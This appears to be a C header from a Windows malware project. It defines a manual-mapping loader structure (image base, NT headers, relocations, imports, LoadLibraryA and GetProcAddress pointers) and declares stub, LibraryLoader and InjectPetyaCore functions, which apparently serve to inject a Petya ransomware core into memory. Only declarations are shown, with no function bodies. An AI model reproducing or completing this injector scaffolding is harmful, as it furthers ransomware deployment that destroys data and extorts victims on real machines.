#pragma once
#include <TlHelp32.h>

typedef HMODULE( __stdcall* pLoadLibraryA )( LPCSTR );
typedef FARPROC( __stdcall* pGetProcAddress )( HMODULE, LPCSTR );

typedef INT( __stdcall* dllmain )( HMODULE, DWORD, LPVOID );


typedef struct loaderdata
{
	LPVOID ImageBase;

	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_BASE_RELOCATION BaseReloc;
	PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;

	pLoadLibraryA fnLoadLibraryA;
	pGetProcAddress fnGetProcAddress;

}loaderdata;


//exports

DWORD __stdcall
stub(

);

DWORD __stdcall
LibraryLoader(
	LPVOID Memory
);

VOID
InjectPetyaCore(

);